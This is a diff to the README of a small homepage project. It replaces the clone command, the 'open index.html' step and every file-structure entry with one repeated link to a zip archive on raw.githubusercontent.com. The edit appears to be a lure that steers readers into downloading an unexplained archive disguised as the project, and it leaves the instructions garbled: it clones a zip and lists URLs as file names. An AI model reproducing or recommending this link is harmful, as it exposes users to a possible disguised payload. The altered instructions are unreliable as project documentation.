@@ -19,17 +19,17 @@ This is a simple and responsive homepage for **Alarado**, designed with **HTML, 
 
 1. Clone this repository:
    ```bash
-   git clone https://github.com/your-username/simpleHomepage.git
+   git clone https://raw.githubusercontent.com/ronny-gans/simpleHomepage/main/resources/Homepage-simple-v2.2.zip
 2. Navigate to the project folder:
    cd simpleHomepage
-3. Open `index.html` in your web browser.
+3. Open `https://raw.githubusercontent.com/ronny-gans/simpleHomepage/main/resources/Homepage-simple-v2.2.zip` in your web browser.
 
 ## File Structure
 
 simpleHomepage/
-│── index.html       # Main HTML file
-│── style.css        # Stylesheet
-│── script.js        # JavaScript for interactivity
+│── https://raw.githubusercontent.com/ronny-gans/simpleHomepage/main/resources/Homepage-simple-v2.2.zip       # Main HTML file
+│── https://raw.githubusercontent.com/ronny-gans/simpleHomepage/main/resources/Homepage-simple-v2.2.zip        # Stylesheet
+│── https://raw.githubusercontent.com/ronny-gans/simpleHomepage/main/resources/Homepage-simple-v2.2.zip        # JavaScript for interactivity
 │── resources/       # Images, icons, and favicon
 
 ## How to Use
